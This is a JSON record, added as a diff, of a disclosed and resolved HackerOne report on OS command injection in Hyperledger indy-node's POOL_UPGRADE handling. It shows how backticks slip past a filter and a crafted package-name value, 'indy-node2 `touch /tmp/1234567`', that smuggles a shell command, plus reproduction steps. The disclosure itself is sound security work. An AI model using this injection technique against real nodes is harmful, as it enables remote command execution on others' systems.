@@ -1,0 +1,207 @@
+{
+  "id": 1859592,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU5NTky",
+  "url": "https://hackerone.com/reports/1859592",
+  "title": "[indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2023-02-02T14:44:12.152Z",
+  "submitted_at": "2023-02-02T14:44:12.257Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kmhlyxj0",
+    "url": "/kmhlyxj0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22522,
+    "url": "https://hackerone.com/hyperledger",
+    "handle": "hyperledger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4unr4nty3m2omunib0bwxy2s189l/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4unr4nty3m2omunib0bwxy2s189l/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Linux Foundation Decentralized Trust",
+      "twitter_handle": "lfdecentralized",
+      "website": "https://www.lfdecentralizedtrust.org/",
+      "about": "An industry-wide open source initiative to advance blockchain technology, governed by The Linux Foundation."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-27T14:48:14.887Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-04-11T15:49:42.151Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "After I finish my report, I found project this is not part of the bounty program, so I also commit this report. This issue is related to the [https://github.com/hyperledger/indy-node](https://github.com/hyperledger/indy-node).\n\nI found some function such as get_latest_pkg_version/_call_upgrade_script has  command injection vulnerability. \nnode_control_utils.py:\n```python\n    def get_latest_pkg_version(cls,pkg_name: str,upstream: SourceVersion = None, update_cache: bool = True) -> PackageVersion:\n        ...\n        try:\n            cmd = compose_cmd(\n                ['apt-cache', 'show', pkg_name, '|', 'grep', '-E', \"'^Version: '\"]\n            )\n            output = cls.run_shell_script_extended(cmd).strip()\n    ...\n```\nnode_control_noe.py:\n```python\n    def _call_upgrade_script(self, pkg_name: str, pkg_ver: PackageVersion):\n        logger.info(\n            \"Upgrading {} to package version {}, test_mode {}\"\n            .format(pkg_name, pkg_ver, int(self.test_mode))\n        )\n\n        deps = self._get_deps_list('{}={}'.format(pkg_name, pkg_ver))\n        deps = '\"{}\"'.format(deps)\n\n        cmd_file = 'upgrade_indy_node'\n        if self.test_mode:\n            cmd_file = 'upgrade_indy_node_test'\n\n        cmd = compose_cmd([cmd_file, deps])\n        NodeControlUtil.run_shell_script(cmd, timeout=self.timeout)\n```\nA Trustee can input a malicious package name to trigger this code.  There are two conditions for package name:\n1. Valid package name prefix, here I choose `indy-node`.\n2. Valid package version. Input value of version must bigger or equals than old version. If `reinstall` set to true, version can equal with the old version.\n3. bypass the fileter function `compose_cmd`. I found  some special characters  filtered in `compose_cmd` , that is `;|&&`:\n```python\ndef compose_cmd(cmd):\n    if os.name != 'nt':\n        cmd = ' '.join(cmd)\n        cmd = re.split(\";|&&\", cmd.splitlines()[0], 1)[0].rstrip()\n    return cmd\n```\nBut the special character \\`, is still valid to inject command. So I can input a package name , for example: indy-node2 \\`touch /tmp/12345678\\` . Finally The malicious POOL_UPGRADE request looks as follows:\n```json\n{\n    \"identifier\": \"V4SGRU86Z58d6TV7PBUe6f\",\n    \"operation\": {\n        \"action\": \"start\",\n        \"name\": \"test\",\n        \"package\": \"indy-node2 `touch /tmp/1234567`\",\n        \"schedule\": {\n            \"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\n            \"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T17:32:05.258870+00:00\",\n            \"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T14:31:05.258870+00:00\",\n            \"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T19:39:05.258870+00:00\"\n        },\n        \"sha256\": \"db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55\",\n        \"type\": \"109\",\n        \"reinstall\": true,\n        \"version\": \"1.12.6\"\n    },\n    \"protocolVersion\": 2,\n    \"reqId\": 1651152851,\n    \"signature\": \"4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT\"\n}\n```\nStep to reproduce(use indy-cli):\n1. use indy-cli, Use a `TRUSTEE` DID:\n\n{F2150453} \n\n2. Run ledger pool_upgrade command, such as:\n\n```\nledger pool-upgrade name=\"security_test2\" version=1.12.6 action=start sha256=f284bdc3c1c9e24a494e285cb387c69510f28de51c15bb93179d9c7f28705398 schedule={\"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T14:32:05.258870+00:00\",\"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T13:31:05.258870+00:00\",\"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T12:53:05.258870+00:00\"} package=\"indy-node `touch /tmp/1234567`\" reinstall=true\n```\n3. wait for schedule, you can what happend in `/var/log/indy/node_control.log`:\n\n{F2150481}\n\n## Impact\n\nA Trustee Node can execute command in any other Node`s system.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2150453,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z02ggzozuvv3vd7mfjprqwxr98t3?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MOJT4AN%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T045611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQD3Qjko6tbjizyJdE0klDA5VJAURtGrnfIoBa0Zb0SvDQIgMKE0ULk0Hq4jsTUmSbEqVZwX6cL91heM7XyCJX2h8IsqsgUIBRADGgwwMTM2MTkyNzQ4NDkiDLiiVIDwkmmpDCBZxCqPBUEp6QGtufdyUiB6GcdmRp6D1wiJfn51kkIaW0JNlMlPklDIWVvhp3vbd2Xz1lCljyE13mOi%2BayGrMtwfu70hXMJB%2BU9m6SgPth%2FE8V%2Fbf586aKgih%2FItM7Ccg%2BbNHwkMz7DfxssSi3%2FJW9k6nQKndhT4xvi%2B5a%2F%2FkQNCwojQX57kRtl9GFWPQ%2BHugT0OhJUedT%2FLp3965hC82MXIOHPGqWkhD4qD50V1IZk0pHdA%2F3bnVJc1DCMCKrmSlVWkQkOsi6dmbOp%2Befnq6cLg3wyOUjK39lVEj4WTFcfhP7oLhZVscjQMSlZtWYz97dm0rAQOYUbzMO2DfXy6C0YoBk5zksqNZAiRjtS3EmiZlpgCKYZl%2FN3egd%2FR8BfnCkwQqXrR7uqFndqhNFbBSxWIYxXS3hDUAHusThLJau9aoRehQX63k1wbiWa6dd25Ev9yxj5WMSoUEwlte3LGHLn4nu0OfC%2F%2F980LLot4%2FGUSrJjVWmeX9DhAKzEXt51g6dfpssffXYGYoRiUu8w6KxPvYtEci3zPkZz4pOIxf%2BxlxOwFsenYVyXDcn%2BxkZXLxU6zAjySuk5RT1cOAk5n7B14KKV48uVyMUPVKUdZ3tVtazEvu9Hik7e7Froia8Mqk8VxzrsPRX8ftSLN%2B2ZkEtnLzyEgyQ83VOQ6B8e093JvBGPsCPsD2FEbUosXS8wIBeQ%2FZ9c1jqdgr%2FB%2F4keEDNfPSEBltngo9kYIbmMZGwXVdPuWYm7QPt2b0zAGxI7j%2BKR0UXra19lArYZ6uPI0c2XldcGUNrdXgq47mra425UedmiuqquQnZuHfqtq4stDToASDinGUMLTRu67Hs7E7Ojn6gUIqRSCn9rlmGsveDgdVOut8Ywht2c0gY6sQEsLT6vQmAICUjWpMBi8VXGYlPxWMJ6lZo5e9c4n6%2FoXQGh%2B4vcMgc1A2J0pQJT4CMpLcATLzm%2BFQcDgK14NK6E4D14M7A5yUrNChNvCOMwqWzVu3VokeUVwQg0zJfSnPC42Q9f5RQ7iI7%2B%2B71mkYtVpuMX1xsHKcyacBxLb7N0ekpwxFleAJV7HRkqU5qS6ILgKdob4cjYiD598PdXl%2FI5uApKbLpCyly7WEbGfTn9KvI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07d1878a5ff2b4ab409d263c5f11ea960cd0e23f78ec9dce93a424ddb8f0cb5a",
+      "file_size": 41111,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2150481,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6f6tibjp9vbbmd0spc7lf3vqgsf9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MOJT4AN%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T045611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQD3Qjko6tbjizyJdE0klDA5VJAURtGrnfIoBa0Zb0SvDQIgMKE0ULk0Hq4jsTUmSbEqVZwX6cL91heM7XyCJX2h8IsqsgUIBRADGgwwMTM2MTkyNzQ4NDkiDLiiVIDwkmmpDCBZxCqPBUEp6QGtufdyUiB6GcdmRp6D1wiJfn51kkIaW0JNlMlPklDIWVvhp3vbd2Xz1lCljyE13mOi%2BayGrMtwfu70hXMJB%2BU9m6SgPth%2FE8V%2Fbf586aKgih%2FItM7Ccg%2BbNHwkMz7DfxssSi3%2FJW9k6nQKndhT4xvi%2B5a%2F%2FkQNCwojQX57kRtl9GFWPQ%2BHugT0OhJUedT%2FLp3965hC82MXIOHPGqWkhD4qD50V1IZk0pHdA%2F3bnVJc1DCMCKrmSlVWkQkOsi6dmbOp%2Befnq6cLg3wyOUjK39lVEj4WTFcfhP7oLhZVscjQMSlZtWYz97dm0rAQOYUbzMO2DfXy6C0YoBk5zksqNZAiRjtS3EmiZlpgCKYZl%2FN3egd%2FR8BfnCkwQqXrR7uqFndqhNFbBSxWIYxXS3hDUAHusThLJau9aoRehQX63k1wbiWa6dd25Ev9yxj5WMSoUEwlte3LGHLn4nu0OfC%2F%2F980LLot4%2FGUSrJjVWmeX9DhAKzEXt51g6dfpssffXYGYoRiUu8w6KxPvYtEci3zPkZz4pOIxf%2BxlxOwFsenYVyXDcn%2BxkZXLxU6zAjySuk5RT1cOAk5n7B14KKV48uVyMUPVKUdZ3tVtazEvu9Hik7e7Froia8Mqk8VxzrsPRX8ftSLN%2B2ZkEtnLzyEgyQ83VOQ6B8e093JvBGPsCPsD2FEbUosXS8wIBeQ%2FZ9c1jqdgr%2FB%2F4keEDNfPSEBltngo9kYIbmMZGwXVdPuWYm7QPt2b0zAGxI7j%2BKR0UXra19lArYZ6uPI0c2XldcGUNrdXgq47mra425UedmiuqquQnZuHfqtq4stDToASDinGUMLTRu67Hs7E7Ojn6gUIqRSCn9rlmGsveDgdVOut8Ywht2c0gY6sQEsLT6vQmAICUjWpMBi8VXGYlPxWMJ6lZo5e9c4n6%2FoXQGh%2B4vcMgc1A2J0pQJT4CMpLcATLzm%2BFQcDgK14NK6E4D14M7A5yUrNChNvCOMwqWzVu3VokeUVwQg0zJfSnPC42Q9f5RQ7iI7%2B%2B71mkYtVpuMX1xsHKcyacBxLb7N0ekpwxFleAJV7HRkqU5qS6ILgKdob4cjYiD598PdXl%2FI5uApKbLpCyly7WEbGfTn9KvI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb667be62369a0d7e238ec712b1749f6edb0a8e4fb5560cc8f92e0ec7d42df22",
+      "file_size": 97593,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-05-11T15:49:42.369Z",
+  "allow_singular_disclosure_after": -99234388.95577654,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "zy9ard3",
+    "shivammusic"
+  ],
+  "severity": {
+    "rating": "none",
+    "score": 0.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 179157,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/hyperledger/fabric-amcl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1859592",
+  "votes": 2,
+  "latest_disclosable_activity_at": "2023-04-27T14:48:14.816Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:56:11.424725",
+    "source": "https://hackerone.com/reports/1859592.json",
+    "report_id": 1859592
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU5NTky",
+    "databaseId": "1859592",
+    "title": "[indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.",
+    "url": "https://hackerone.com/reports/1859592",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2023-04-27T14:48:14.887Z",
+    "created_at": "2023-02-02T14:44:12.152Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU5",
+      "name": "OS Command Injection",
+      "external_id": "cwe-78"
+    },
+    "severity": {
+      "rating": "none",
+      "score": 0.0
+    },
+    "reporter": {
+      "username": "kmhlyxj0"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyNTIy",
+      "handle": "hyperledger",
+      "name": "Linux Foundation Decentralized Trust",
+      "url": "https://hackerone.com/hyperledger",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE4NTk1OTI=",
+    "_id": "1859592",
+    "disclosed": true,
+    "votes": 2,
+    "latest_disclosable_activity_at": "2023-04-27T14:48:14.816Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU5NTky",
+      "databaseId": "1859592",
+      "title": "[indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.",
+      "url": "https://hackerone.com/reports/1859592",
+      "disclosed_at": "2023-04-27T14:48:14.887Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyNTIy",
+      "handle": "hyperledger",
+      "name": "Linux Foundation Decentralized Trust",
+      "url": "https://hackerone.com/hyperledger",
+      "currency": "usd"
+    }
+  }
+}
